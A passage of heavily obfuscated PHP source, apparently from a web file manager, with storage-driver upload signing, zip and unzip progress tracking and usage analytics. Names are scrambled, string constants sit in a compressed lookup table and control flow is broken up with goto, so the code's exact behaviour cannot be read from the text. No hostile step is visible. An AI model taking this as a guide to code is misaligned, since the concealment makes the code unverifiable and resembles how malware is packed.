$fÍ†ÍÉæÊğ = IO::info($fŒæ”¨º«®[$A‰ì‘ï‡¹ª[86]]); $fÍ†ÍÉæÊğ = is_array($fÍ†ÍÉæÊğ) ? $fÍ†ÍÉæÊğ : array(); $fŒæ”¨º«® = array_merge($fÍ†ÍÉæÊğ, $fŒæ”¨º«®); $fŒæ”¨º«®[$A‰ì‘ï‡¹ª[95]] = Action($A‰ì‘ï‡¹ª[1068])->shareItemInfo($fŒæ”¨º«®); } unset($fŒæ”¨º«®); return $D¸ÚŠĞ½–¨; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($d˜Èˆ‘ÔÊ) { parent::__construct($d˜Èˆ‘ÔÊ); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($a˜—Ø‡Ôµ) { parent::__construct($a˜—Ø‡Ôµ); $this->signatureVersion($_SERVER[£¶ä½¶¢][222]); } public function uploadFormData($EËŸ«¹ä·ë, $EØÑõ¹¨ÑŞ = 3600) { goto Cíµ“˜êªÈ; a¨ˆÎ¨ĞÒã: $dãëÕ–©¦ = hash_hmac($b‡õ÷º‡ê[1231], $f×æ‘ÙµŸÍ, $Fç²‡Åáà³, !0); $bïµå³ùç– = hash_hmac($b‡õ÷º‡ê[1231], $EÛ­åİ¹ÅŒ, $dãëÕ–©¦, !0); $EÛß—×Ê¹Ì = hash_hmac($b‡õ÷º‡ê[1231], $e™Ìò–…©, $bïµå³ùç–); goto aÚ‹Ğ±Àé–; E‰Úƒ”î²: $f×æ‘ÙµŸÍ = $b‡õ÷º‡ê[69]; $d‘É…ÆĞ¶¢ = gmdate($b‡õ÷º‡ê[1222]); $DçĞí·¸áã = gmdate($b‡õ÷º‡ê[719]); goto c·…§‹‚æ; Cíµ“˜êªÈ: $b‡õ÷º‡ê =& $_SERVER[£¶ä½¶¢]; $EÔŸ°„®ëƒ = $b‡õ÷º‡ê[202]; $F¥…ÔÚõŒÚ = $b‡õ÷º‡ê[1221]; goto E‰Úƒ”î²; c·…§‹‚æ: $EÛ­åİ¹ÅŒ = $b‡õ÷º‡ê[1223]; $B†Ó¶©Å„ = $EØÑõ¹¨ÑŞ . $b‡õ÷º‡ê[43]; $D‹‘ìÍ¦° = $b‡õ÷º‡ê[1186]; goto A‹—Ÿ‡ëÛõ; A‹—Ÿ‡ëÛõ: $a ‰÷³¥íÛ = array($this->accessKey, $DçĞí·¸áã, $this->region, $f×æ‘ÙµŸÍ, $EÛ­åİ¹ÅŒ); $B…î’ìÕàØ = implode($b‡õ÷º‡ê[18], $a ‰÷³¥íÛ); $eç³’¨Ü–ö = array($b‡õ÷º‡ê[1188] => gmdate($b‡õ÷º‡ê[1187], strtotime($b‡õ÷º‡ê[1224])), $b‡õ÷º‡ê[1189] => array(array($b‡õ÷º‡ê[1191] => $this->bucket), array($b‡õ÷º‡ê[1190] => $EÔŸ°„®ëƒ), array($b‡õ÷º‡ê[1192], $b‡õ÷º‡ê[1193], $b‡õ÷º‡ê[43]), array($b‡õ÷º‡ê[1192], $b‡õ÷º‡ê[1225], $b‡õ÷º‡ê[43]), array($b‡õ÷º‡ê[1192], $b‡õ÷º‡ê[1226], $b‡õ÷º‡ê[43]), array($b‡õ÷º‡ê[1194] => $D‹‘ìÍ¦°), array($b‡õ÷º‡ê[1227] => $B…î’ìÕàØ), array($b‡õ÷º‡ê[1228] => $F¥…ÔÚõŒÚ), array($b‡õ÷º‡ê[1229] => $d‘É…ÆĞ¶¢), array($b‡õ÷º‡ê[1230] => $B†Ó¶©Å„))); goto e¨±É‚‹…ğ; aÚ‹Ğ±Àé–: $E¼ƒÚ­ôÑÎ = array($b‡õ÷º‡ê[221] => $b‡õ÷º‡ê[43], $b‡õ÷º‡ê[1233] => $b‡õ÷º‡ê[43], $b‡õ÷º‡ê[1190] => $EÔŸ°„®ëƒ, $b‡õ÷º‡ê[1194] => $D‹‘ìÍ¦°, $b‡õ÷º‡ê[1198] => $e™Ìò–…©, $b‡õ÷º‡ê[1234] => $B…î’ìÕàØ, $b‡õ÷º‡ê[1235] => $F¥…ÔÚõŒÚ, $b‡õ÷º‡ê[1236] => $d‘É…ÆĞ¶¢, $b‡õ÷º‡ê[1237] => $B†Ó¶©Å„, $b‡õ÷º‡ê[1238] => $EÛß—×Ê¹Ì, $b‡õ÷º‡ê[185] => $this->getHost()); return $E¼ƒÚ­ôÑÎ; goto d»àó½ƒÎŒ; e¨±É‚‹…ğ: $e™Ìò–…© = base64_encode(json_encode($eç³’¨Ü–ö)); $bº†”»ŠÍš = hash_hmac($b‡õ÷º‡ê[1231], $DçĞí·¸áã, $b‡õ÷º‡ê[1232] . $this->secret, !0); $Fç²‡Åáà³ = hash_hmac($b‡õ÷º‡ê[1231], $this->region, $bº†”»ŠÍš, !0); goto a¨ˆÎ¨ĞÒã; d»àó½ƒÎŒ: } } goto föØôÄöƒ‰; f»Œô¢‰Àõ: $_SERVER[£ÛúôÆ˜öÒòş] = explode($_SERVER[£¶ä½¶¢][583], gzinflate(substr($_SERVER[£¶ä½¶¢][584], 10, -8))); $EğÁ±Ü‹–— = $_SERVER[£¶ä½¶¢][585]; while ($EğÁ±Ü‹–— < $_SERVER[£¶ä½¶¢][586]) { if ($EğÁ±Ü‹–— >= 0) { break; } $EğÁ±Ü‹–—++; } goto A¥‹¡¤®­Ä; cÈõóÂéê®: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto e³¨¡Ûè—; F”Æ§ì‚…ƒ: Hook::bind($bÉ©åÁ’èí[1087], array($this, $bÉ©åÁ’èí[1610])); $F–† çÜº³ =& $this->task; $F–† çÜº³[$bÉ©åÁ’èí[1611]] = $bÉ©åÁ’èí[1092]; goto F‡øÊº ¿ù; e³¨¡Ûè—: $bÉ©åÁ’èí =& $_SERVER[£¶ä½¶¢]; parent::startAfter(); Hook::bind($bÉ©åÁ’èí[1608], array($this, $bÉ©åÁ’èí[1609])); goto F”Æ§ì‚…ƒ; F‡øÊº ¿ù: if (!$F–† çÜº³[$bÉ©åÁ’èí[1432]]) { $F–† çÜº³[$bÉ©åÁ’èí[1432]] = LNG($bÉ©åÁ’èí[1612]); } goto f“ö”¸Û•; f“ö”¸Û•: } protected function endAfter() { $a×îƒ‡Ê«† =& $_SERVER[£¶ä½¶¢]; parent::endAfter(); Hook::unbind($a×îƒ‡Ê«†[1608], array($this, $a×îƒ‡Ê«†[1609])); Hook::unbind($a×îƒ‡Ê«†[1087], array($this, $a×îƒ‡Ê«†[1610])); } public function updateAfter() { $d¼õ…ÁÏ’Ü =& $_SERVER[£¶ä½¶¢]; $eìºµ„¡„¤ =& $this->task; if (!$eìºµ„¡„¤[$d¼õ…ÁÏ’Ü[1019]] || !$eìºµ„¡„¤[$d¼õ…ÁÏ’Ü[731]]) { return; } if ($eìºµ„¡„¤[$d¼õ…ÁÏ’Ü[1611]] == $d¼õ…ÁÏ’Ü[1092]) { $cÀ¦øĞÜ· = 0; if ($eìºµ„¡„¤[$d¼õ…ÁÏ’Ü[1570]]) { $cÀ¦øĞÜ· = $eìºµ„¡„¤[$d¼õ…ÁÏ’Ü[1571]] / $eìºµ„¡„¤[$d¼õ…ÁÏ’Ü[1570]]; } $eìºµ„¡„¤[$d¼õ…ÁÏ’Ü[1527]] = $cÀ¦øĞÜ· * 0.3; } else { if ($eìºµ„¡„¤[$d¼õ…ÁÏ’Ü[1611]] == $d¼õ…ÁÏ’Ü[320]) { $cÀ¦øĞÜ· = $eìºµ„¡„¤[$d¼õ…ÁÏ’Ü[1034]] / $eìºµ„¡„¤[$d¼õ…ÁÏ’Ü[1019]]; $eìºµ„¡„¤[$d¼õ…ÁÏ’Ü[1527]] = 0.3 + $cÀ¦øĞÜ· * 0.4; } else { if ($eìºµ„¡„¤[$d¼õ…ÁÏ’Ü[1611]] == $d¼õ…ÁÏ’Ü[117]) { $a¡³ÕÇÀ–¾ = 0; if ($eìºµ„¡„¤[$d¼õ…ÁÏ’Ü[1572]] == $d¼õ…ÁÏ’Ü[117]) { $a¡³ÕÇÀ–¾ = $eìºµ„¡„¤[$d¼õ…ÁÏ’Ü[1571]]; } $cÀ¦øĞÜ· = ($eìºµ„¡„¤[$d¼õ…ÁÏ’Ü[1575]] + $a¡³ÕÇÀ–¾) / $eìºµ„¡„¤[$d¼õ…ÁÏ’Ü[731]]; $eìºµ„¡„¤[$d¼õ…ÁÏ’Ü[1527]] = 0.3 + 0.4 + $cÀ¦øĞÜ· * 0.3; } } } if ($eìºµ„¡„¤[$d¼õ…ÁÏ’Ü[1527]] > 0) { $FÖôš±¯œÉ = timeFloat() - $eìºµ„¡„¤[$d¼õ…ÁÏ’Ü[757]] - $eìºµ„¡„¤[$d¼õ…ÁÏ’Ü[1530]]; $eìºµ„¡„¤[$d¼õ…ÁÏ’Ü[1531]] = $FÖôš±¯œÉ * (1 - $eìºµ„¡„¤[$d¼õ…ÁÏ’Ü[1527]]) / $eìºµ„¡„¤[$d¼õ…ÁÏ’Ü[1527]]; } } public function addFile($a³Ò¦Ş×îà) { goto aØÖ³›±; BÕÍ…Šõ„õ: $A‡ãà¸İ‰[$DíÍ‘ëÔÅ[1568]] = $f—èëÑìÍá[$DíÍ‘ëÔÅ[38]]; $A‡ãà¸İ‰[$DíÍ‘ëÔÅ[1570]] = $f—èëÑìÍá[$DíÍ‘ëÔÅ[88]]; $A‡ãà¸İ‰[$DíÍ‘ëÔÅ[1571]] = 0; goto E£½é¤¼·; díàÁ«ñù: $A‡ãà¸İ‰[$DíÍ‘ëÔÅ[1019]] = 1; $DÂèÍÁõè— = 0; $A‡ãà¸İ‰[$DíÍ‘ëÔÅ[1579]] = array($DíÍ‘ëÔÅ[1580] => $DÂèÍÁõè— + 1, $DíÍ‘ëÔÅ[421] => $f—èëÑìÍá[$DíÍ‘ëÔÅ[38]], $DíÍ‘ëÔÅ[86] => $f—èëÑìÍá[$DíÍ‘ëÔÅ[86]], $DíÍ‘ëÔÅ[503] => $f—èëÑìÍá[$DíÍ‘ëÔÅ[503]] ? $f—èëÑìÍá[$DíÍ‘ëÔÅ[503]] : $f—èëÑìÍá[$DíÍ‘ëÔÅ[86]]); goto e‰Ëåá˜ˆÏ; aØÖ³›±: $DíÍ‘ëÔÅ =& $_SERVER[£¶ä½¶¢]; $A‡ãà¸İ‰ =& $this->task; $f—èëÑìÍá = IO::info($a³Ò¦Ş×îà); goto BÕÍ…Šõ„õ; E£½é¤¼·: $A‡ãà¸İ‰[$DíÍ‘ëÔÅ[1021]] = $DíÍ‘ëÔÅ[1587]; $A‡ãà¸İ‰[$DíÍ‘ëÔÅ[1572]] = $DíÍ‘ëÔÅ[1092]; $A‡ãà¸İ‰[$DíÍ‘ëÔÅ[731]] = $f—èëÑìÍá[$DíÍ‘ëÔÅ[88]]; goto díàÁ«ñù; e‰Ëåá˜ˆÏ: $this->update(); goto eœÒçÈëÅŸ; eœÒçÈëÅŸ: } public function unzipAfter($AÏÊ¢‰Ä) { goto a˜ÂíáÚÎÃ; F™õ‹›¿ó´: $this->update(); self::log($c‚óàŸÚç[1613] . json_encode(array($eÄâÅòªØà, $Fíµ¡‘İ×ù))); goto cÉÎàÂİ¬®; dÂºî×®’˜: $eÄâÅòªØà[$c‚óàŸÚç[1568]] = $c‚óàŸÚç[43]; $eÄâÅòªØà[$c‚óàŸÚç[1575]] = 0; $eÄâÅòªØà[$c‚óàŸÚç[731]] = $Fíµ¡‘İ×ù[$c‚óàŸÚç[88]]; goto F™õ‹›¿ó´; a˜ÂíáÚÎÃ: $c‚óàŸÚç =& $_SERVER[£¶ä½¶¢]; $eÄâÅòªØà =& $this->task; $eÄâÅòªØà[$c‚óàŸÚç[1611]] = $c‚óàŸÚç[117]; goto e‡Ô¦Íİá¬; EÎ¡²³“È: if ($Fíµ¡‘İ×ù[$c‚óàŸÚç[39]] == $c‚óàŸÚç[203]) { $eÄâÅòªØà[$c‚óàŸÚç[1019]] = 1; } else { $eÄâÅòªØà[$c‚óàŸÚç[1019]] = $Fíµ¡‘İ×ù[$c‚óàŸÚç[91]][$c‚óàŸÚç[89]]; } $eÄâÅòªØà[$c‚óàŸÚç[1021]] = $c‚óàŸÚç[43]; $eÄâÅòªØà[$c‚óàŸÚç[1572]] = 0; goto eŒ¤ò˜ÛÀÅ; e‡Ô¦Íİá¬: $Fíµ¡‘İ×ù = IO::infoWithChildren($AÏÊ¢‰Ä); $B‘¶Îî°• = 0; $eÄâÅòªØà[$c‚óàŸÚç[1579]] = array($c‚óàŸÚç[1580] => $B‘¶Îî°• + 1, $c‚óàŸÚç[421] => $Fíµ¡‘İ×ù[$c‚óàŸÚç[38]], $c‚óàŸÚç[86] => $Fíµ¡‘İ×ù[$c‚óàŸÚç[86]], $c‚óàŸÚç[503] => $Fíµ¡‘İ×ù[$c‚óàŸÚç[503]] ? $Fíµ¡‘İ×ù[$c‚óàŸÚç[503]] : $Fíµ¡‘İ×ù[$c‚óàŸÚç[86]]); goto EÎ¡²³“È; eŒ¤ò˜ÛÀÅ: $eÄâÅòªØà[$c‚óàŸÚç[1034]] = 0; $eÄâÅòªØà[$c‚óàŸÚç[1570]] = 0; $eÄâÅòªØà[$c‚óàŸÚç[1571]] = 0; goto dÂºî×®’˜; cÉÎàÂİ¬®: } public function nameParse($dĞˆËŞ´Ëâ) { goto CË·À¤Àìƒ; CË·À¤Àìƒ: $aãÔ²¥Ï‚¼ =& $_SERVER[£¶ä½¶¢]; $BôÃî¬îÄ¤ =& $this->task; if ($BôÃî¬îÄ¤[$aãÔ²¥Ï‚¼[1611]] == $aãÔ²¥Ï‚¼[1092]) { $BôÃî¬îÄ¤[$aãÔ²¥Ï‚¼[1611]] = $aãÔ²¥Ï‚¼[320]; $BôÃî¬îÄ¤[$aãÔ²¥Ï‚¼[1575]] = 0; $BôÃî¬îÄ¤[$aãÔ²¥Ï‚¼[731]] = 0; } goto aÁÀ­‰ŒÈ¸; eÛØê±ë: $this->update(); goto A³„°ö¹µ; aÁÀ­‰ŒÈ¸: $c‹¢Éˆ¢ŠÊ = get_path_this($dĞˆËŞ´Ëâ); if (strstr($c‹¢Éˆ¢ŠÊ, $aãÔ²¥Ï‚¼[105])) { $BôÃî¬îÄ¤[$aãÔ²¥Ï‚¼[1034]] += 1; $BôÃî¬îÄ¤[$aãÔ²¥Ï‚¼[1019]] += 1; } $BôÃî¬îÄ¤[$aãÔ²¥Ï‚¼[1568]] = $dĞˆËŞ´Ëâ; goto eÛØê±ë; A³„°ö¹µ: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $Cî¦ŞØá‘Í =& $_SERVER[£¶ä½¶¢]; parent::startAfter(); Hook::bind($Cî¦ŞØá‘Í[1614], array($this, $Cî¦ŞØá‘Í[1609])); $eÊÁÂÚø” =& $this->task; $eÊÁÂÚø”[$Cî¦ŞØá‘Í[1611]] = $Cî¦ŞØá‘Í[1092]; if (!$eÊÁÂÚø”[$Cî¦ŞØá‘Í[1432]]) { $eÊÁÂÚø”[$Cî¦ŞØá‘Í[1432]] = LNG($Cî¦ŞØá‘Í[1615]); } } protected function endAfter() { $DÑàÂÁÜÌ¨ =& $_SERVER[£¶ä½¶¢]; parent::endAfter(); Hook::unbind($DÑàÂÁÜÌ¨[1614], array($this, $DÑàÂÁÜÌ¨[1609])); } public function updateAfter() { $aíÔ¥äë =& $_SERVER[£¶ä½¶¢]; $FÆˆƒçÉ =& $this->task; if (!$FÆˆƒçÉ[$aíÔ¥äë[1019]] || !$FÆˆƒçÉ[$aíÔ¥äë[731]]) { return; } if ($FÆˆƒçÉ[$aíÔ¥äë[1611]] == $aíÔ¥äë[1092]) { $eÜÂ—•É¤ö = $FÆˆƒçÉ[$aíÔ¥äë[1571]]; if ($FÆˆƒçÉ[$aíÔ¥äë[1572]] != $aíÔ¥äë[1092]) { $eÜÂ—•É¤ö = 0; } $b¦İç‚Â¹ = ($FÆˆƒçÉ[$aíÔ¥äë[1575]] + $eÜÂ—•É¤ö) / $FÆˆƒçÉ[$aíÔ¥äë[731]]; $FÆˆƒçÉ[$aíÔ¥äë[1527]] = $b¦İç‚Â¹ * 0.3; } else { if ($FÆˆƒçÉ[$aíÔ¥äë[1611]] == $aíÔ¥äë[320]) { $b¦İç‚Â¹ = $FÆˆƒçÉ[$aíÔ¥äë[1034]] / $FÆˆƒçÉ[$aíÔ¥äë[1019]]; $FÆˆƒçÉ[$aíÔ¥äë[1527]] = 0.3 + $b¦İç‚Â¹ * 0.5; } else { if ($FÆˆƒçÉ[$aíÔ¥äë[1611]] == $aíÔ¥äë[117]) { $b¦İç‚Â¹ = 0; if ($FÆˆƒçÉ[$aíÔ¥äë[1570]]) { $b¦İç‚Â¹ = $FÆˆƒçÉ[$aíÔ¥äë[1571]] / $FÆˆƒçÉ[$aíÔ¥äë[1570]]; } $FÆˆƒçÉ[$aíÔ¥äë[1527]] = 0.3 + 0.5 + $b¦İç‚Â¹ * 0.2; } } } if ($FÆˆƒçÉ[$aíÔ¥äë[1527]] > 0) { $FÚ–Ÿˆ»Ê = timeFloat() - $FÆˆƒçÉ[$aíÔ¥äë[757]] - $FÆˆƒçÉ[$aíÔ¥äë[1530]]; $FÆˆƒçÉ[$aíÔ¥äë[1531]] = $FÚ–Ÿˆ»Ê * (1 - $FÆˆƒçÉ[$aíÔ¥äë[1527]]) / $FÆˆƒçÉ[$aíÔ¥äë[1527]]; } } public function copyFileStart($dóÒ¸ùôÌ, $C «‹×„ñ«, $fí™„¡ÆÚ×, $dæÑÜÎ„ì†, $C‘öá°“Š², $c÷®²´…É) { $cÃÎ“ÏÏÒ =& $_SERVER[£¶ä½¶¢]; parent::copyFileStart($dóÒ¸ùôÌ, $C «‹×„ñ«, $fí™„¡ÆÚ×, $dæÑÜÎ„ì†, $C‘öá°“Š², $c÷®²´…É); $A²†¨ä§Ô“ =& $this->task; if ($A²†¨ä§Ô“[$cÃÎ“ÏÏÒ[1611]] == $cÃÎ“ÏÏÒ[320]) { $A²†¨ä§Ô“[$cÃÎ“ÏÏÒ[1611]] = $cÃÎ“ÏÏÒ[117]; } $this->update(); } public function copyFileEnd($aÀÔ‡Å¨¤¹, $fÈ÷”öÖ¡…, $EÈšîÖäë†, $Cë¸è¦¶µ“, $aî›î—ù´’, $EÔ®‰œß£Ñ) { $eëÎ¥†ï„ =& $_SERVER[£¶ä½¶¢]; $e»æ‘éÙ‰ç =& $this->task; $e»æ‘éÙ‰ç[$eëÎ¥†ï„[1571]] = $e»æ‘éÙ‰ç[$eëÎ¥†ï„[1570]]; $e»æ‘éÙ‰ç[$eëÎ¥†ï„[1575]] += $e»æ‘éÙ‰ç[$eëÎ¥†ï„[1570]]; $e»æ‘éÙ‰ç[$eëÎ¥†ï„[1572]] = $eëÎ¥†ï„[43]; $this->update(); } public function nameParse($B•™‹ŒÇª¤) { $FÑóáÛÛ™¯ =& $_SERVER[£¶ä½¶¢]; $CÉ¦Úã =& $this->task; if ($CÉ¦Úã[$FÑóáÛÛ™¯[1034]] < $CÉ¦Úã[$FÑóáÛÛ™¯[1019]]) { $BÔé„»Á© = get_path_this($B•™‹ŒÇª¤); if (strstr($BÔé„»Á©, $FÑóáÛÛ™¯[105])) { $CÉ¦Úã[$FÑóáÛÛ™¯[1034]] += 1; } } if ($CÉ¦Úã[$FÑóáÛÛ™¯[1611]] == $FÑóáÛÛ™¯[1092]) { $CÉ¦Úã[$FÑóáÛÛ™¯[1611]] = $FÑóáÛÛ™¯[320]; } $CÉ¦Úã[$FÑóáÛÛ™¯[1568]] = $B•™‹ŒÇª¤; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($CŸ¾Æëì†Õ) { $D —ÚŸ¬Á‘ =& $_SERVER[£¶ä½¶¢]; $EíÌ†‡¼Ô = array($D —ÚŸ¬Á‘[570] => array($D —ÚŸ¬Á‘[39] => $D —ÚŸ¬Á‘[1616], $D —ÚŸ¬Á‘[280] => array($D —ÚŸ¬Á‘[232], $D —ÚŸ¬Á‘[733], $D —ÚŸ¬Á‘[1617], $D —ÚŸ¬Á‘[1618])), $D —ÚŸ¬Á‘[1619] => array($D —ÚŸ¬Á‘[39] => $D —ÚŸ¬Á‘[1620], $D —ÚŸ¬Á‘[280] => array($D —ÚŸ¬Á‘[232], $D —ÚŸ¬Á‘[731], $D —ÚŸ¬Á‘[1621], $D —ÚŸ¬Á‘[1622], $D —ÚŸ¬Á‘[1623]))); if (!isset($EíÌ†‡¼Ô[$CŸ¾Æëì†Õ])) { return !1; } $this->optionType = $EíÌ†‡¼Ô[$CŸ¾Æëì†Õ][$D —ÚŸ¬Á‘[39]]; $this->field = $EíÌ†‡¼Ô[$CŸ¾Æëì†Õ][$D —ÚŸ¬Á‘[280]]; return !0; } public function listData($A •î¦Çè = false, $CŞÇâ„‚¹ = "\155\157\x64\x69\146\171\x54\151\155\145", $f›¼ÚÎîÔ¶ = false) { return parent::listData($A •î¦Çè, $CŞÇâ„‚¹, $f›¼ÚÎîÔ¶); } public function trendList($bĞ³ˆÍƒ) { goto f‰ˆµš¬À; dë•É¾ÒŠ‹: foreach ($EŸ‡á˜Óò as $AÕ¨»°´à‡) { $this->{$Dé—Ğ‡™¿À}($AÕ¨»°´à‡); } return $this->listData(); goto bÏßš çÒ×; f‰ˆµš¬À: $A†å†ºâ¬ù =& $_SERVER[£¶ä½¶¢]; $e®Õ£Œğã = $this->listData(); if ($e®Õ£Œğã) { $dˆ”éÊ¤º = end($e®Õ£Œğã); $AÕ¨»°´à‡ = date($A†å†ºâ¬ù[1624], strtotime($A†å†ºâ¬ù[1625])); if ($dˆ”éÊ¤º[$A†å†ºâ¬ù[232]] == $AÕ¨»°´à‡) { return $e®Õ£Œğã; } $Dìˆ¾˜¶êµ = strtotime($dˆ”éÊ¤º[$A†å†ºâ¬ù[232]]); } goto e¿£ÃÑ‰‘; e¿£ÃÑ‰‘: if (!isset($Dìˆ¾˜¶êµ)) { $bÉÄŒ¡¯á‹ = $bĞ³ˆÍƒ == $A†å†ºâ¬ù[570] ? $A†å†ºâ¬ù[514] : $A†å†ºâ¬ù[798]; $Dìˆ¾˜¶êµ = Model($bÉÄŒ¡¯á‹)->min($A†å†ºâ¬ù[204]); } $Dé—Ğ‡™¿À = $A†å†ºâ¬ù[1626] . ucfirst($bĞ³ˆÍƒ); $EŸ‡á˜Óò = $this->dateList($Dìˆ¾˜¶êµ); goto dë•É¾ÒŠ‹; bÏßš çÒ×: } private function dateList($aõï’Á®Ø) { $DàØ‚‡µŸÌ =& $_SERVER[£¶ä½¶¢]; $DÕéØÃêğ = $aõï’Á®Ø; $fÄ•®… = strtotime($DàØ‚‡µŸÌ[1625]); $f¶ŠäÛÅè = array(); while ($DÕéØÃêğ <= $fÄ•®…) { $f¶ŠäÛÅè[] = date($DàØ‚‡µŸÌ[1624], $DÕéØÃêğ); $DÕéØÃêğ = strtotime($DàØ‚‡µŸÌ[1627], $DÕéØÃêğ); } return $f¶ŠäÛÅè; } public function _recordUser($b±‘¿ŞÔÙ¯ = '') { goto F·¿é›·Ë; F·¿é›·Ë: $cØ—âå´éˆ =& $_SERVER[£¶ä½¶¢]; $A¨ÈËôëŸñ = strtotime(date($cØ—âå´éˆ[1628], strtotime($b±‘¿ŞÔÙ¯))); $F¯ëÊ‚ºìè = strtotime(date($cØ—âå´éˆ[1629], strtotime($b±‘¿ŞÔÙ¯))); goto F†ˆ„ŠŞ”¦; B„Ãµ¶–ÖŸ: $b¤è‘·¤é = Model($cØ—âå´éˆ[514])->where($FòêÑ•Åò‡)->count($cØ—âå´éˆ[1526]); $FòêÑ•Åò‡[$cØ—âå´éˆ[39]] = $cØ—âå´éˆ[1630]; $EÃÍ¨‘…†™ = Model($cØ—âå´éˆ[1631])->where($FòêÑ•Åò‡)->count($cØ—âå´éˆ[1632]); goto fÊ‰¡Ğ“àÔ; fÊ‰¡Ğ“àÔ: $C›˜èß½ƒñ = array($cØ—âå´éˆ[232] => $b±‘¿ŞÔÙ¯, $cØ—âå´éˆ[733] => (int) $DœŠˆÁğäÁ, $cØ—âå´éˆ[1617] => (int) $b¤è‘·¤é, $cØ—âå´éˆ[1618] => (int) $EÃÍ¨‘…†™); return $this->insert($C›˜èß½ƒñ); goto D¡ºÏùÃÏğ; F†ˆ„ŠŞ”¦: $FòêÑ•Åò‡ = array($cØ—âå´éˆ[204] => array($cØ—âå´éˆ[968], $F¯ëÊ‚ºìè)); $DœŠˆÁğäÁ = Model($cØ—âå´éˆ[514])->where($FòêÑ•Åò‡)->count($cØ—âå´éˆ[1526]); $FòêÑ•Åò‡[$cØ—âå´éˆ[204]] = array($cØ—âå´éˆ[340], array($A¨ÈËôëŸñ, $F¯ëÊ‚ºìè)); goto B„Ãµ¶–ÖŸ; D¡ºÏùÃÏğ: } public function _recordStore($E·ğÊ½ÔÀŒ = '') { goto f¼Ø¸ä´; f´Ú÷§â²: $EÏ‚è ÛæÈ = Model($eÂÉÒ™ßø[458])->where($E×†ßßÙâÅ)->sum($eÂÉÒ™ßø[88]); $E×†ßßÙâÅ[$eÂÉÒ™ßø[411]] = 0; $D…µ¨×Á¹¾ = Model($eÂÉÒ™ßø[798])->where($E×†ßßÙâÅ)->sum($eÂÉÒ™ßø[88]); goto a”ÃœŠÆ¶Š; cá§Ô¹à: $AÚ‹İ©Š¶¿ = Model($eÂÉÒ™ßø[798])->where($E×†ßßÙâÅ)->sum($eÂÉÒ™ßø[88]); $BöÊË·ì™» = array($eÂÉÒ™ßø[232] => $E·ğÊ½ÔÀŒ, $eÂÉÒ™ßø[731] => (int) $D…µ¨×Á¹¾, $eÂÉÒ™ßø[1621] => (int) $EÏ‚è ÛæÈ, $eÂÉÒ™ßø[1622] => (int) $aµÃ¼¯‘õš, $eÂÉÒ™ßø[1623] => (int) $AÚ‹İ©Š¶¿); return $this->insert($BöÊË·ì™»); goto aŞÚ‰“¯Ö; a”ÃœŠÆ¶Š: $E×†ßßÙâÅ[$eÂÉÒ™ßø[412]] = 1; $aµÃ¼¯‘õš = Model($eÂÉÒ™ßø[798])->where($E×†ßßÙâÅ)->sum($eÂÉÒ™ßø[88]); $E×†ßßÙâÅ[$eÂÉÒ™ßø[412]] = 2; goto cá§Ô¹à; f¼Ø¸ä´: $eÂÉÒ™ßø =& $_SERVER[£¶ä½¶¢]; $CÕçÛÌ®Æ‹ = strtotime(date($eÂÉÒ™ßø[1629], strtotime($E·ğÊ½ÔÀŒ))); $E×†ßßÙâÅ = array($eÂÉÒ™ßø[204] => array($eÂÉÒ™ßø[968], $CÕçÛÌ®Æ‹)); goto f´Ú÷§â²; aŞÚ‰“¯Ö: } public function trend($d’¾šµì, $cäÑª…‰éÌ) { goto E¶×ö¶‹Ì; eê¬ò‹ÆáÇ: if ($aéâ„ÈÔŸ¿ && $cäÑª…‰éÌ != $AÑáà—Ãáœ[1500]) { $dÊê¥ßö = $aéâ„ÈÔŸ¿[0][$AÑáà—Ãáœ[232]]; $aœœí‡›êñ = $this->validDate($cäÑª…‰éÌ, $dÊê¥ßö); $B²óÏ×­ßá = array(); $c·§î£óïš = array_to_keyvalue($aéâ„ÈÔŸ¿, $AÑáà—Ãáœ[232]); foreach ($aœœí‡›êñ as $fŒæ¥†›Î) { if (isset($c·§î£óïš[$fŒæ¥†›Î])) { $F†“½Œëè» = $c·§î£óïš[$fŒæ¥†›Î]; } else { $F†“½Œëè» = end($aéâ„ÈÔŸ¿); $F†“½Œëè»[$AÑáà—Ãáœ[232]] = $fŒæ¥†›Î; if ($d’¾šµì == $AÑáà—Ãáœ[570]) { $F†“½Œëè»[$AÑáà—Ãáœ[1617]] = $F†“½Œëè»[$AÑáà—Ãáœ[1618]] = 0; } } $B²óÏ×­ßá[] = $F†“½Œëè»; } $aéâ„ÈÔŸ¿ = $B²óÏ×­ßá; } $B’³èŠø½æ = array($AÑáà—Ãáœ[570] => array($AÑáà—Ãáœ[733] => LNG($AÑáà—Ãáœ[1633]), $AÑáà—Ãáœ[1617] => LNG($AÑáà—Ãáœ[1634]), $AÑáà—Ãáœ[1618] => LNG($AÑáà—Ãáœ[1635])), $AÑáà—Ãáœ[1619] => array($AÑáà—Ãáœ[731] => LNG($AÑáà—Ãáœ[1636]), $AÑáà—Ãáœ[1621] => LNG($AÑáà—Ãáœ[1637]), $AÑáà—Ãáœ[1622] => LNG($AÑáà—Ãáœ[1638]), $AÑáà—Ãáœ[1623] => LNG($AÑáà—Ãáœ[1639]))); $E¥‹‹àëêÎ = array($AÑáà—Ãáœ[570] => $AÑáà—Ãáœ[1640], $AÑáà—Ãáœ[1619] => $AÑáà—Ãáœ[88]); goto AóÚ²‘±·º; E¶×ö¶‹Ì: $AÑáà—Ãáœ =& $_SERVER[£¶ä½¶¢]; if (!$this->init($d’¾šµì)) { return !1; } $aéâ„ÈÔŸ¿ = $this->trendList($d’¾šµì); goto eê¬ò‹ÆáÇ; E¸ ÒÒ”´: return $dƒªÀğÃ®; goto Aª‡íÒÈéÍ; AóÚ²‘±·º: if (empty($aéâ„ÈÔŸ¿)) { $fŒæ¥†›Î = date($AÑáà—Ãáœ[1624], strtotime($AÑáà—Ãáœ[1625])); $c™ºŠøùÄÃ = array($AÑáà—Ãáœ[232] => $fŒæ¥†›Î); foreach ($B’³èŠø½æ[$d’¾šµì] as $FÉ«¶¡Ğ¡‘ => $cé¹íĞµÒ) { $c™ºŠøùÄÃ[$FÉ«¶¡Ğ¡‘] = 0; } $aéâ„ÈÔŸ¿[] = $c™ºŠøùÄÃ; } $dƒªÀğÃ® = array(); foreach ($aéâ„ÈÔŸ¿ as $cé¹íĞµÒ) { if ($d’¾šµì == $AÑáà—Ãáœ[1619] && $cé¹íĞµÒ[$AÑáà—Ãáœ[1621]] > $cé¹íĞµÒ[$AÑáà—Ãáœ[731]]) { 